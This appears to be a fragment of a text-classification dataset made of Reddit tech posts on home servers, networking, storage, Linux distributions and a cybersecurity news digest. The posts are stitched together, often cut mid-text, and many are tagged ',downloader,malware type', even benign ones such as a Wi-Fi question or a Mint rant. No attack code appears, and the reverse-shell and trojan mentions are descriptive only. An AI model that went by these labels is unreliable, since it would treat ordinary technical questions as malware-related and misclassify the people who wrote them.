At some point, I just got kind of addicted to learning that stuff for it's own sake, but very importantly, there was a practical application I could use it towards to advantage my life (even if it's like getting Radarr working on my NAS).  


At this point, I'm not claiming to be an expert on any of this, but it's be very helpful both personally and professionally. It's lead to skills I can put on my resume, and it lets me talk to people in other departments more easily and efficiently using their language. I can understand IT more as a holistic practice rather than just my own domain, with a vague understanding of what the others do. Plus, as you learn this stuff, the learning curve just gets easier and easier (at least I haven't hit a wall yet). I've taken classes on virtualization, serverless deployment, and orchestration even though I probably wouldn't really need to to do it personally (if anyone has a good use case for using kubernetes for self hosting, please let me know)

I never knew that deciding to host a container one day out of boredom would be so beneficial to my personal and professional life! Also, shout out to a lot of the people who make learning content generally free and available. Funnily enough, I actually think Data Engineering is the the least you need to know with regards to self hosted containerization, because you are mainly just downloading apps from a repository with the data portion already figured out.",downloader,malware type

&nbsp;

I don't think what I'm looking for is the most complicated thing, but I'm struggling with it.

Even though I work in IT, networking and server stuff are more challenging for me to grasp than I thought. And life being what it is in the past few months, I haven't had much time to dedicate to searching and tinkering to achieve my goals. I had kind of given up on this challenge, but I'd like to try again.

Currently, it only run a Plex server, but when I built it I intended to do much more.

&nbsp;

Here's what I have:

- **The server:**

 * Chassis: SuperMicro SC826
 * Motherboard: Asus PRIME Z790-P D4
 * CPU: i5-12600
 * RAM: 32GB
 * OS: Unraid
 * 2x500 NVME SSDs for Unraid's appdata
 * 1x2TB NVME SSD for download cache/copy buffer
 * Enough space with a mix of HDDs for the disk array

- **A Synology DS216+II,** which I've been using for a long time, mainly for the ""Photos"" app (quite disappointing by today's standards) and some basic document storage.
- **A HP Prodesk 400 G3 Mini** (i5-6100T/8GB RAM/2 SSDs), also running Unraid, used as a test machine in the past. No really in use today.
- **A domain name** from Google that I had set up to be managed via Cloudflare, following some video guides. However, I'm a little confused about the ANAME, CNAME stuff.
- **An fibre connection** with 600Mbps upload but with a dynamic IP (not behind a CGNAT).

&nbsp;

I am lucky enough to have all this equipment at my disposal, and I would like to do more than just running a Plex server.

Initially, I planned to host game servers for colleagues/family, such as Minecraft or simple SteamCMD servers with Unraid. I explored the AMP and Pterodactyl path but failed.

I hope that, in the end, I can run stuff like EmulatorJS, game servers and other services/docker containers, and make some of them accessible from the outside on my domain name in the most secure way possible.

In the past, I had managed to make some of them accessible, but after seeing the scans and attempted attacks reported by Cloudflare on my domain name, I got a bit scared and, even though I only had the HTTPS port open at that time, I shut everything down.

&nbsp;

From what I've read, it seems that Cloudflare tunnels might be the solution for me. Do you agree or would you recommend another direction?

Tunnels for HTTP are ok, but for game servers, I have concerns about the added latency. Is it still viable?

&nbsp;

All that to say, what direction do you think I should take to get all this up and running?

Regardless of which direction to take, do you have any recommended links or videos that you think would help me and that you'd like to share?

I have noticed an issue with long file read/write/copy/delete times on a new external SSD I purchased (Crucial XB 2TB)

I am downloading some music production software from a well known, established developer using their official installer. The software package is about 440GB and is downloaded in about 100 separate compressed archives.

Once downloaded, the installer begins automatically unpacking the archives. Here is the issue: the unpack time took about 36 hours (!!). I expected it to take a few hours at least due to the large filesize, but 36 hours felt absurd. I assumed it was some faulty optimization by the developer and went along with it.

I was also attempting to remove a large folder of about 180GB worth of files. Deletion was estimated to take more than 1 day by the windows file explorer. This seemed odd to me since I have deleted much larger folders than that within about a half hour.

I checked to see if this was an issue with my PC, so I took a 3GB folder from my main internal SSD and copied it to another location within the main SSD. Copy time was fastest at 120MBps with periodic drops to 50MBps - about what I'm used to. 

I copied this same 3GB folder to my secondary internal SSD, speeds remained right around 70MBps the entire time. I copied the folder from there to an external HDD that I had, and saw a significant slow down to 10MB/s.

However, that's far from the case. The team has a high turnover due to a project manager and team leads needing to figure out what to do. 

The team maintains RHEL images with vulnerability scanner software. Additionally, the images must be configured with security implementation guides. The team additionally provides patches to the system for the security vulnerability software. Once this has been done, the vulnerability scanner is run, and the findings are patched. A physical copy is made and distributed for production. 

This is all completed off-network because the project manager will not/cannot maintain our systems on the network. I am constantly creating ""up-to-date"" images on disc drives and installing them to test them. I need to download the patches from a machine on network to patch the systems.

Since this is my first time working in this environment, I must rely on something other than my team leader for direction. The silver lining is I have been given clearance to rewrite the process.

Im not sure that this is the exact issue with the software, maybe something happens after it runs that DLL that doesnt show up on procmonitor, but if anyone could help me figure this out i would be very grateful. here is a screenshot of the procmonitor logs and i show where it fails (the new pc is on the left, the old one on the right):  [https://imgur.com/a/pVhHaQC](https://imgur.com/a/pVhHaQC)

Moreover, considering that that frontend had a previous hacking issue, I am concerned that the local server I run may have been exposed externally.

Here are the specific questions I'm curious about:

1. First of all, I used a home router when I run my local server. And I didn't do any port forwarding or DMZ settings. Is there a possibility that my server was exposed externally?
2. Assuming that someone is unable to access my localhost server for any reason, would it still be possible for them to search for information about my server using hacking tools or other means?

Started w/ a 64gb usb drive (this is the one I used to boot my computer onto linux a short time ago so it should be working just fine, had no issues then).   
\- Go into Disks > format > format   
 \- create partition FAT32 (I've also tried NTFS and had the exact same result)  
\- download windows 10 iso for 64 bit directly from windows (yes I've tried redownloaded new versions throughout troubleshooting)  
\- open .iso with disk mount, copy all files, paste onto drive  


Every time without fail it stops and fails in copying over install.wim. Consistently for windows 10 stopping at 4.3/5.2 gb. this is a 64gb harddrive with a 64gb partition it is not full. I've let it sit for long time it is not still loading it freezes at exactly byte 4,294,267,295.  


I've been trying all day now, Moving every single other file in the iso besides the install.wim at (iso)/sources/install.wim work perfectly fine, but when I try to load the install it just freezes and never loads. Unplugging after any amount of time hanging causes the drive to corrupt and I need to reformat. Unplugging and plugging back in before attempting to move over the install.wim file everything works perfectly fine as expected.   


My computer meets all the requirements for windows etc. etc. I have been running it with windows last month, moving to linux was a recent thing, then I got my external linux server working that I just ssh into for my projects, so I want my main desktop back to windows for convenience sake. I think I've tried just about everything and it just does not like this file. its worth noting also that I am able to boot off of the drive without the install.wim file, and it lets me go through the normal windows 10 install prompt, but hten pops up saying I'm missing the driver, to plug it in and restart. I've also tried multiple different usb ports on my computer so that is not the issue. To test I made a random txt file that is 15gb and tried copying it all over onto the usb drive right after formatting to see if it would work and it took that just fine, when the total size of the iso is only around 6, so it isn't a storage issue, it must be sommeting within the install.wim itself. I have a preference for windows 10, but if I must I can just do 11. I've tried both via this exact same method both on FAT32 and NTFS and both had the exact same error, although windows 11 stops at a slightly different place in the install.wim copying since it is a different size.

Right now, we are both connected to wifi only, but he does have the router and modem right on his desk so he can easily plug in. I, however, am on the other side of the house and now seem to be struggling to remain connected on my work computer, which is REQUIRED to be connected via VPN. He has only been working from home for a little over a week, and up until last Friday, I hadn't experienced any connection issues. Today, I couldn't stay in a Teams meeting for work to save my life. My VPN was constantly disconnecting and reconnecting if I tried to access anything more than my Outlook email. We did switch VPN providers through work about two weeks ago, so I'm not sure if that really has anything to do with it or not, but I can't keep missing these meetings, so I HAVE to get something figured out.

Being summer... we also have at least four of our six kids home almost all day on their various wifi connected devices, a few of them with multiple devices. I don't want to limit their wifi access, as they're keeping up on their chores and such, and I don't want the fact that we're both home full-time now to feel like a punishment to them. The oldest has also been struggling to keep their PC, located in the basement,  connected to the wifi for gaming since we moved in, but hasn't had any issues with the XBOX connection in the same room.

I've run multiple speed tests on multiple devices in almost every location in the house and got similar results, all stating we should have a sufficient connection to handle multiple devices streaming HD videos, video conferencing, and gaming at the same time. I just tested it as I'm typing this and got 271 Mbps download and 22 Mbps upload with 37 ms latency sitting in the exact location I work from every day.

We have an IT shop competitor in town who also did email, but you had to have an active business service through them (keeping this fairly vague). Last year Google made a change, which resulted in our competitor restricting their email service to anyone willing to pay to keep their email going. This year they gave an ending date.

The few that came to my office, a couple wanted to move to GMail. After sitting down and setting up their new GMail accounts, GMail couldn't discover the other email service. They also had POP3 disabled, so GMail's automated import wouldn't work.

It took a day (well, three days, multiple visits/remote sessions to step through everything) to download everything through Thunderbird, then ""Copy To"" the new GMail accounts.

I'm not looking for a solution, the end date had come and went, but why GMail couldn't find the email domain pointing to its own services has me wondering. The only thing I could determine, the company toggled an option to prevent migration, along side disabling POP3 (I understand why Pop3 would be disabled).",downloader,malware type

709,"I hate static release distros. A week ago I switched from arch to mint because I couldn't be bothered to type a few commands. Had to install it 3 times for it to even start working. The amount of time I spent troubleshooting it to get it to boot for the first time could've been spent installing arch. Twice.

The more I use it I realize how ancient the software in ubuntu based distros are. It ships with neovim 0.6 in official repos and 0.7 in neovim debian backport ppa. I had random freezes to which nothing responds (sysrq, Ctrl+Alt+F<n>). I had more unsafe shutdowns within a few days of installing mint than I had in a whole year.

It shipped with linux 5.15 by default. I needed 6.0, and couldn't find it in the official repos. So I put my gentoo hat on, downloaded the source, compiled and installed. GRUB just broke after I installed 6.4.3. Uninstalling the kernel fixed nothing. Reinstalling GRUB didn't solve it. None of the well known bootloaders worked (GRUB, systemd-boot, refind, directly booting the kernel with UEFI).

Initially it was my fault, but after I fixed the relevant files it still doesn't work. Removed `quiet` and `splash` and still nothing. CapsLock does not blink in panic. Finally, I somehow managed to get the system working through insane hacking, then suspended it so I can resolve the issues later while logged in. And guess what, it didn't wake up from suspend. Just a black screen. At that point I just lost it for mint.

I've done worse in arch. I replaced the kernel with a custom compiled one (with stricter config, missing modules and a custom linux-firmware god knows where I got it from), replaced systemd with openrc. That shit was maintained with duct tape and prayers but still managed to boot and work exactly when and how I needed it.


So, fuck ubuntu, fuck mint. Hell yeah, even fuck manjaro. I am switching to gentoo right now and wouldn't look back at beginner friendly distros.

Edit: Mint live (which I was installing gentoo through) crashed upon waking from suspend and I am about to smash the screen.",downloader,malware type
710,"Week 28 in Brief: Revolut's $20M Loss, ScarletEEL's Cloud Exploits, US Govt. Emails Compromised, Windows Malicious Drivers and ToiToin Ransomware Targeting Banks. Every Monday, I release ""[Mandos Brief](https://blog.mandos.io)"" - a compact yet comprehensive review of the five most significant cybersecurity events from the previous week. This includes both brief summaries and analysis. The aim is to provide an informative resource to keep cybersecurity community well-informed and raise awareness among newcomers in the field.

Here's a recap of the past week:

**Revolut's $20 Million Lesson: The Cost of a Payment System Exploit**

- Cyber criminals exploited a flaw in Revolut's payment systems, stealing more than $20 million of the company's funds.
- The breach was due to discrepancies between Revolut's US and European systems, causing funds to be erroneously refunded when transactions were declined.
- The issue was first detected in late 2021, but before it could be fixed, criminal groups leveraged the loophole, making expensive purchases that would be declined and then withdrawing the refunded amounts.
- The exact technical details associated with the flaw are currently unclear, but the mass fraud scheme resulted in a net loss of about $20 million for Revolut.

**ScarletEEL's Exploits Terraform, Kubernetes, and AWS**

- ScarletEEL, a sophisticated cloud operation, exploited a containerized workload and escalated privileges into an AWS account to steal proprietary software and credentials.
- The attack started from a compromised Kubernetes container and spread to the victim's AWS account, demonstrating the attacker's knowledge of AWS cloud mechanics such as EC2 roles, Lambda serverless functions, and Terraform.
- The attacker used a Terraform state file to attempt to pivot to other connected AWS accounts, aiming to spread their reach throughout the organization.
- Cyberattacks in the cloud have increased by 56% over the past year, with motives ranging from exfiltrating sensitive data, creating new resources for cryptomining, and more espionage-focused motives.

**US Government Emails Compromised by China-Based Espionage Group**

- US Government Emails Compromised by China-Based Espionage Group.
- The cyber attackers exploited a flaw in Microsoft's cloud email service, gaining access to accounts since May 2023.
- The State Department and Commerce Department were among the affected agencies.
- Microsoft, upon being alerted by the US government, mitigated the attack, although it's unclear if any sensitive data was exfiltrated.

**Windows Policy Loophole Is A Gateway for Malicious Drivers**

- Cyber attackers are exploiting a Windows policy loophole to forge signatures on kernel-mode drivers.
- The loophole allows the loading of drivers signed before July 29, 2015, using open-source tools such as HookSignTool and FxxkCertVerifyTimeValidity.
- The policy was designed to maintain compatibility with older software, allowing them to load older drivers in Windows 10 and Windows 11 without Microsoft's safety review.
- Microsoft has blocked the offending drivers and suspended the developer program accounts involved in the incident.

**ToiToin: The Rising Threat to Latin American Banking**

- ToiToin is a new Windows-based banking trojan active since 2023, primarily targeting businesses in Latin America.
- The trojan employs a multistage infection chain and custom-made modules to carry out malicious activities such as injecting harmful code into remote processes, circumventing user account control, and evading detection by sandboxes.
- ToiToin can collect data from installed web browsers and system information. It also checks for Topaz Online Fraud Detection (OFD), an anti-fraud module embedded into financial platforms in the Latin America region.
- The infection begins with a phishing email, leading to a zip archive hosted on an Amazon EC2 instance. The archive contains a downloader executable that sets up persistence and communicates with a remote server to retrieve next-stage payloads.",downloader,malware type

I have a Samsung Galaxy A14. I downloaded some podcasts to 'My Files'. However, if I go to the home screen, the podcast stops playing. This results in the podcast not playing continuously if I am walking somewhere, presumably because it is being jumbled around in my pocket. 

I looked around for some solutions. [One site](https://podcastrocket.net/podcast-stops-when-phone-locks/) said to switch the podcast app's battery status from 'optimised' to 'unrestricted'. I did this with 'My Files', but the same thing happened--when I went back to the home screen, it stopped playing.

[Another site](https://help.podbean.com/support/solutions/articles/25000004962-android-why-is-the-podcast-i-m-playing-stopping-suddenly-) suggested going to 'battery settings', but I was unable to find any such thing in my phone's settings, nor a 'battery optimisation page' for my phone.

I'm doing this through the GUI Dolphin SFTP browser, so I can just drag and drop one file to another folder and it'll give me the option ""Link Here"" to create the symlink, but if I do that, then the content from the Qbittorrent container doesn't show up when Jellyfin tried to scan for it. 

I just wanted to ask if this is just how it is, or if I'm doing this wrong?

The setup for the docker containers are as follows: \~/Docker/Jellyfin, \~/Docker/Jellyfin/Qbittorrent. I thought this setup would work if the Qbittorrent container was inside the Jellyfin container, but it doesn't.

I know very little about networking, and bought a few Deco mesh routers for my home a couple months ago.

Spectrum is my ISP, and I'm on whatever their gigabit internet plan is. 

My wifi works pretty well most of the time, always get pretty good results from speed tests and never have issues with internet being slow on any of my devices. But every so often the wifi will drop out, and it will remain out (or with ""limited connectivity / no internet access"" per the error message when I connect on my phone) until I unplug the routers and the spectrum modem. Restarting the routers alone does not usually fix the issue, I do not get internet back until I restart my modem (notably both of the lights on my modem are good indicating that the modem is normal). This is not a daily occurrence. It started happening more frequently so I checked and saw my Decos had a software update available, and after downloading the software update I didn't run into any problems for a few weeks. It just happened again a couple of days ago, and then again today.  I thought maybe there was another software update available, but nope. 

My settings are all whatever the defaults would be, as I have no knowledge of best practices for networking. I have a bunch of devices always connected - currently 21 online as I type this.

    /srv/ssd*:/srv/hdd*  /srv/pool      fuse.mergerfs  minfreespace=16G,moveonenospc=ff,allow_other,use_ino,cache.files=off,dropcacheonclose=true,category.create=ff   0       0

Do note the `ff` policy (first found). This makes sure that all the newly downloaded media will move to `/srv/ssd{1..x}` So I solved one thing right now, merging all disks. Makes it also easy for \*arr, jellyfin, jellyseer to find and alter the files.

But. Still. 1 problem. I still wan't sure how I am going to make the fast cache happen without *or* filling my SSD so far that it save all new files to the HDD *or* that I am going to move the files all by myself.

Luckely MergerFS has some guidence around this called ['tiered caching'](https://github.com/trapexit/mergerfs#tiered-caching). Now I was halfway. I now how to move the files around the correct way.

>Please don't move from the pool to a disk in the pool. E.g. `mv /srv/pool /srv/hdd1`. If you do this, you coincidentally destroy the file.

So. Trying to automate this I have created a tool called Jellymover ([https://github.com/joepbuhre/jellymover](https://github.com/joepbuhre/jellymover)). It's an amazing little CLI tool which you can schedule regurarly to move the files. It goes as follows:

1. It reads the Jellyfin api (horrible api by the way)
2. It checks if it's already archived by checking an Archive tag
3. Matches agains and excludes / includes list
4. Checks if the file should be moved
5. Moves the file to your specified archive location!

744,"OpenCamera will let me set specific framerates but won't record at them?. Hi, so I've been having trouble with OpenCamera. I upgraded by phone from a Samsung Galaxy A12 to a Samsung Galaxy A14 less than a week ago and I expected it to basically have the majority of the features that my older phone had, which I purchased in 2021. 

On the A12, it allowed me to record at 24fps with no real issues or sudden framerate shifts. However when I try to record at 24fps on my new phone and set it to shoot at 24fps it doesn't. It only shoots at 30fps. I tried 25fps and lower but it all shot at 30fps. I attempted to shoot at 60fps but it recorded at 100fps. 

I downloaded an older version and it gave me a notice that the framerate and bitrate was incompatible with my phone. 

This is a bit frustrating as this is a new phone and I had only received that kind of notice when using the app on much older Samsung products so I'm wondering if there's anyway I can fix this at all?

There is 9.5GB of 15GB used but I literally got nothing on it. I don't save pictures. If I take a picture or a video I will save it on my computer or delete it on the phone the next day.

But now a month later even after I deleted those files, removed telegram, it's slow again for some reason. What changed is that recently I started using the phone more to browse content online. But I downloaded nothing. I just go in google image and browse pictures to get inspirations for my job. It seems like the app is perhaps storing all those pictures somewhere.

749,"I spent 50 days in Windows after having been 100% on Linux for the last two years.... I was working on creating game mods for a game that only runs well on Windows, and decided to stay 100% on Windows to see what it felt like being 100% immersed in the Windows experience, and what I was ""missing out on"". These were my experiences as a developer and power user who actively uses tons of applications simultaneously, and needs quick access to files and development tools:

&#x200B;

1. The first thing that stands out is... Windows is so slow. Menus take forever to load. I search something in start menu, and sometimes get instant results, but most of the time it stays FROZEN for 5 seconds before results come and then takes another 5 seconds to open the app after I click it. It's a far cry from the instant results I get with Ulauncher and GNOME Overview on Linux.
2. Application windows on screen are a huge damn mess to try to manage. The alt-tab ""window list"" really, really, really sucks. It's just a long list of windows in jumbled ""most recently used"" order. On GNOME, alt-tab switches between actual apps and alt-tilde switches between windows of the active app, so it's extremely fast to switch to another application and find its windows there. On Windows, the experience of finding open application windows is a damn nightmare. As a developer who has to constantly switch between 10 open windows, it's been incredible torture trying to find the correct windows on Windows...
3. Applications that open brand new windows often place them at the end of Windows' alt-tab list, or somewhere in the middle, which makes absolutely no sense and makes it hell to get to the newly opened windows.
4. Workspaces (extra desktops) on Windows is a clunky mess. They're slow to open and slow and laggy to switch between. Compare that to GNOME, where workspaces are an instant, beautifully smooth transition and are effortless to move windows around and organize things.
5. The file explorer sucks. It's such a messy file explorer. Feels archaic and bloated at the same time. The right-click menus in it are a total mess (they tried to simplify it in Windows 11, and it's better but still meh since you frequently have to access the full legacy menu to find features).
6. The apps suck. They are ugly and kinda ""German"" looking. :D You know, function > design. Everything looks boring and archaic. That's typical of MS style though. It was never a beautiful OS. Compare it to GNOME's Libadwaita apps, which are clean and elegant. I feel like I'm suffocating when looking at Windows. Most apps are a giant mess of boring and cluttered design.
7. The constant popups are unnerving. Constant notifications about applications that want you to manually download updated versions, or want to tell you ""news"" about the application/store/company, and each application uses its own way of displaying the notifications. Nothing feels cohesive. It's still very rare that applications use the native Windows notification list. Almost every app designs its own popup notifications, which ranges from ""corner of the screen: please upgrade me"", to full-on popups that suddenly appear and cover the entire monitor.
8. The amount of stuff running in the system tray to have a functional system is crazy. Tons of vendor tools for controlling gaming mice, keyboard controllers, water coolers, game launchers, antivirus, NVIDIA control panel applet, etc. Each application uses resources and adds themselves to auto-start without asking. They are also the main reason for the constant popups with things like ""please update"" or ""please buy our other product!"".
9. The amount of bugs is crazy. I use the exact same Realtek 2.5G ethernet port on Linux, and have never, ever had any issues. On Windows, it randomly loses the entire TCP/IP stack connection once or twice a week and requires that I go into Windows Troubleshooter, Networking, and let it scan for errors, whereupon it finds some ""gateway error"" and fixes itself. And as usual on Windows, you can Google the error, but all you will find is endless people with the same bug and no solutions. Because Windows is a black box of mystery with random error codes and no clear solutions to most problems. Just a bunch of stupid, low-tech advice like ""reboot the system or reinstall windows"". Idiotic.
10. The internet connection's download speed sometimes randomly throttled itself to around 1 mbit (while upload speed remained 250 mbit). Only on Windows. No other devices in the home are affected. Just... windows. I could fix it by restarting the TCP/IP stack each time, showing that there's probably some queue congestion or ""stuck"" algorithm going on...
11. The control panel, where I go to fix the networking issues, locked itself and froze randomly. It was impossible to close the window. You could not even kill it via Task Manager. Only a reboot could get rid of the stuck Control Panel window.
12. This other bug is unfixable: When dragging windows on the screen, you will see two mouse cursors and the window will lag behind like jelly. It's a bug that has existed for 4+ years, since Windows 10 days, and has still not been fixed. It's permanently like that for me with all windows I try to drag. Here's a video someone made of it (and tons of people in the comments with the same issue, and it's also mentioned all over the internet): [https://www.reddit.com/r/Windows11/comments/ot3n54/window\_dragging\_lag/](https://www.reddit.com/r/Windows11/comments/ot3n54/window_dragging_lag/)
13. Alright onto productivity again: The file searchability on Windows is the worst of any operating system. Try searching for files in Windows Explorer's search field. It's a nightmare. It's extremely slow and takes several minutes or doesn't even find the files. I literally have Git Bash (Mingw based Bash port) just to I can open the folder there and run the Unix \`find\` command instead. On both Linux (GNOME) and Mac, searching for files produces all results in less than a second.
14. I constantly need various programming/development tools. But it's such a nightmare to install development tools on Windows. Total mess. Lots of struggle, where you go to obscure sites and have to find zip files and manually unpacking them, or installing a tool via Chocolatey ""package manager"" but seeing that it's not available after install. Stuff like that. Makes Windows extremely unpleasant to work on.
15. The terminal is an absolute nightmare to work in. PowerShell thought things like ""ls"" to list files was clearly too easy, so they decided to invent their own crazy language with the most verbose style imaginable. For example, on Linux you'd get the hash of a file with ""sha256sum <file>"". On Windows it's ""Get-FileHash <file> -Algorithm SHA256 | Format-List"". Seriously. You need to memorize that.
16. Configuring things through the registry is a giant mess. It's just a bloated spiderweb of garbage, built on very flaky 1990s foundations. They should scrap the whole system, but everything depends on it, so they're stuck with that garbage. Compare that to Linux where all your configurations are in simple config files either at the system-level or user-level.
17. The operating system's error messages... Oh my god. Whoever thought ""E19238268"" is a good way to tell people about errors is an idiot. On Linux, the error messages end up in the syslog and are so simple to understand that you can usually see the solution directly in the error message itself, such as ""no write permissions to blabla file"", or at least they're detailed enough that you can very quickly find the exact answers online. On Windows, all you find when googling their stupid error numbers is other people with the same inscrutable number error, with zero insight into what the actual error means. ""Thanks, Microsoft.""
18. Windows Update doesn't respect you. Even though you tell it not to update the system, you'll still wake up to a blank login screen after it forcefully rebooted itself at night. Even though you disable automatic Windows Update reboots via the Group Policy Editor, it still does it (this is a well-known and hated issue). I've lost work several times because Windows thinks I need to update ""right now!!!"" and thinks I am too stupid to do the reboot manually when I have time for it later.
19. Windows Update is slow as hell, taking an incredibly absurd amount of time to install updates. And sometimes they roll back themselves due to failure to install them, but will work if you retry a few times. Their system update technique is extremely shoddy.
20. The style of the whole operating system is so ugly. It feels old, boring, ""corporate"" and lifeless. It just has absolutely no taste. [Steve Jobs was completely right about Microsoft.](https://www.youtube.com/watch?v=UiOzGI4MqSU) I recently booted an old version of macOS (10.13) and even though it's half a decade old it still looks and feels a million times better than Windows 11.
21. Windows gradually gets slower the older the installation is. It's absolutely true. Reinstalling Windows is just a temporary cure for the slowness and bloat that always creeps back into Windows again over time. I've never seen that happening on Linux (or Mac for that matter). Linux is as fast and efficient today as when I installed it two years ago.

&#x200B;

In summary, it's an extremely ugly and clunky and very slow operating system where barely anything works well and where practically everything is poorly designed and poorly optimized. It's a nightmare to navigate. It's pure torture to try to do any real work in it. But for some reason, people keep using it and corporations keep demanding that you run Windows to use ""commercial grade pro software"". It's a nauseating world.

It's also honestly a very difficult operating system. The amount of clunky garbage that people have internalized just to be able to use it is actually staggering. When Windows users say ""Windows is easy"", it's just because that's the only thing they've used for the last 30 years. Linux is literally an easier operating system. Easier to understand conceptually. Easier to reason about. Easier to configure and customize. Easier to see what the operating system is doing. Easier to fix issues if an error occurs, since the error tells you what's wrong. It's easier in every way. Even my non-technical 67 year old mother became used to Linux (Fedora Workstation's GNOME) in a week and became very comfortable in 2 months, and a year later she would never go back to Windows.

The only ""hard"" part on Linux is the lack of commercial software and certain drivers for commercial hardware. Although things are getting much better, with lots of companies releasing Linux versions more and more nowadays. And Valve's Steam Deck has really helped us a lot with making game companies put some effort into making their games run great.

Let's hope that our recent breakthrough of 3% market share worldwide keeps us growing faster and faster like an avalanche. We are technically the best alternative for general computer users (since macOS is painfully locked-down and expensive). And Windows is clearly living completely on its popularity alone. There is nothing positive at all about the operating system experience itself.

I gave it heavy usage for nearly two months and Windows was worse than I remembered it, since I've been using something so much better for 2 years now - Linux.",downloader,malware type

Others have also suggested to leave the defaults on uBlock Origin and not add filters, for the same reason.

I recently added the Chameleon addon to Firefox, and set it up to change browser profile every 5 min (Desktop/random), as well as 'Prevent Etag tracking', 'Protect keyboard fingerprinting', 'Spoof font fingerprinting', etc.

It explains how to create a reverse shell in different languages, SSH into the remote machine, download the reverse shell and execute it as root. 
However it is unclear to me how this is used in the 'real' world?
In the real world I don't have access to a machine with sudo permissions so I can upload a file, because if I would why would I upload a reverse shell script?
Or is it used where I have been able to exploit a service, have a shell, upload a script as a 'backdoor' to get back in, if the software gets patched?

765,"Much slower Wi-Fi speeds in AP mode than router mode. So, looking for some insight with this one. I've recently switched from a fairly standard setup with an ISP provided fibre gateway and a TP-Link router, to one where the fibre gateway now goes into a UniFi Security Gateway, and the TP-Link Archer AX55 is connected to the USG and acts just as the wireless access point (and switch). It has been put into AP mode. If you're curious why I've done this... idk, I just wanted to tinker.

This works for the most part, but my wifi speeds are maxing out at 30-40 Mbps now. Over wifi before, I'd easily get 600+ Mbps download on my phone. Internet plan is for 1000/500. I am using Smart Control for the wifi, but I can confirm it's on the 5GHz band as the link speed is showing at 1.1Gbps (and I logged into the TP-Link to confirm).

Anyone have any ideas? There are no QoS settings on the TP-Link that could be causing this, at least none that I can find. Same with the UniFi controller. The whole wifi section doesn't really do much as there are no UniFi APs anyway. Maybe there's some kind of console only QoS command to configure on it? Not sure, but I would think that would be handled by the TP-Link since any devices on the wired LAN are still pushing gigabit speeds just fine.",downloader,malware type

I'm currently running an app on AWS, leveraging Appsync. The app is written in Golang on the backend.

I intend to configure http client to use a secure Https connection.

1. I thought of uploading the certs to S3 but that would require to download the certs at runtime. Not so sure if this is the right approach. Also it seems I would have to always monitor when certs expire. Too manual
2. Using SSM or Secret manager to store the certs. But similar to step 1 monitor when it expires and manually upload certs.

783,"Thoughts on data intensive web application for data visualisation ?. Hello,

I am designing a web application that is used to track the status (available, in maintenance, unavailable, inactive ... ) two times a day (morning and afternoon) of a large number of vehicles of different types. Then I have to produce dynamic statistics for a selected fleet of vehicles and a selected time period and give the proportion for each status (percentage available, in maintenance etc ...).

The application should allow the user to select a vehicle (by identifier ) at a given time (e.g., Morning on July 15th 2023) and then set the status (available, maintenance or other status). The entry is then stored in the database.

Then It should have a data visualisation and statistics tab where the stats from the entered data are produced. For that I first query the database through the backend for status entries given a vehicle fleet and time period to get user entered entries. Then the fronted computes the proportion for each status per year, month, week and shows them in appropriate graphs. There is no datavis software involved. I use d3.js to show some bar charts and scatter plots based on computed stats on the frontend.

Finally, the user can generate a pdf report with relevant stats for a fleet of vehicle and a given time span and download it.

The application currently uses a react frontend, node.js backend with express, and a mssql database server.

Now I face some challenges as the number of vehicles is growing fast and the number of status entries is becoming quite huge. It takes a lot of time to compute stats in the frontend (with plain javascript functions !) and display them in native d3.js graphs.

So i bought a 5800x 6 or 7 months ago, and through all this time i have been cooling it with a wraith prism (i know, not a good idea, just didnt have the money for any other cooler) and just today bought a deepcool captain 240pro v2. I didn't connect the rgb because it didn't came with the cable to do so, but i don't care about the rgb so wasn't really a problem. Now previously with my wraith prism it was getting up to 90 degrees celsius while stressing, which seems normal because it's a shit cooler for a toasty cpu. So now that ive installed the aio, it idles at around 50, which isnt too bad. When i run cinebench it just straight up rockets and gets to 90 celsius in maybe 5 seconds.

It is July and i'm living in Spain with my pc on a second floor while going through a heatwave so some may have to do with that, but the fact that its at the exact same temperature that it was with the wraith prism seems weird to me.

\*\*Welcome to kNOME 2.0!!\*\*

&#x200B;

kNOME is not a ""distro"", a Desktop Environment, or anything even remotely official. It is just a bare-bones Debian Sid installation using GNOME with mostly KDE apps. It's been tweaked for privacy, aesthetics and functionality and burned to an ISO. It can be used in live mode or installed\*\* to a disk. \*\*ENCRYPTION DOES NOT WORK AT THIS TIME - do not select this option during install\*\*

DISCLAIMER: Although, if a user follows Debian protocol they shouldn't have random breakage, kNOME is still an experiment and comes with no warranty. BACK UP YOUR DATA

&#x200B;

TL;DR: 

\-Update around once per week with ""sudo apt update && sudo apt upgrade""

\-Don't add/mix repos, avoid packages that aren't in Debian repo wherever possible

\-Pay CAREFUL attention when you do upgrades to see that important packages aren't being removed.

\-Mark important stuff as ""manually installed."" 

\-If the package manager offers to remove half your desktop, abort immediately and check back in a day or two. This usually means an underlying library is in transition.

I'm looking for some insight regarding strange rsync's behavior I started to experience while working on one of my company's internal scripts responsible for synchronizing production AWS auto scaling machines with project repository (basically storing baked Java projects). The problem is as follows:

When I delete a file from sender's directory, receiver won't sync this change and will keep the file despite being removed from source. BUT, if I remove that file AND make any other change (add new file, add some change in one of existing files etc.), rsync will a) download new file, b) delete file removed from source, as I'd expect.

notes:

`$PROJECT_SRC` points to remote location ubuntu@machine-ip:/srv/service-name

`$LOCAL_CATALOG` points to local location /srv/service-name

directory structure:

\- service-name.jar

\- config/

\- lib/

command:

    rsync --delete --force --recursive $PROJECT_SRC/ /srv/$LOCAL_CATALOG/ -v -a --stats -e ""ssh -o StrictHostKeyChecking=no""

Back in the olden days, I'd just dump all of my pandas/polars tasks in one compact jupyter notebook, download it all as a .py file, and call it a day. I genuinely thought that was better and more compact.

But now after using dbt for the first time, I can sort of see its usefulness. I rewrote the pandas stuff as a chain of CTE statements and breaking them up into different, consecutive SQL files. It really forces you to view things more modular, and while SQL can't do as much stuff as python, I gotta agree that it's overall cleaner to read, even as someone who was taught Python before SQL and thus feels biased for Python.

The only thing I don't know how to exactly do yet is interrupt the dbt midway to do something only python can do, or rather something SQL can't do (like adding columns that are the output of a machine learning method such as k-means, tf-idf, or PCA), and then resuming the dbt.",downloader,malware type

I want to query the cards from a single set in the sets table or from the cards table based on the set code.

The sets table has the following data model (only need the code data):

baseSetSize: number; block?: string; booster?: object; cards: CardSet\[\]; cardsphereSetId?: number; code: string; codeV3?: string; isForeignOnly?: boolean; ... };

839,"Getting direct links through Prowlarr. Two separate but kind of related problems I have using Prowlarr and how it handles links.

I have Prowlarr running in a Docker container and it is hosted via Caddy reverse proxy and Authelia forward auth.

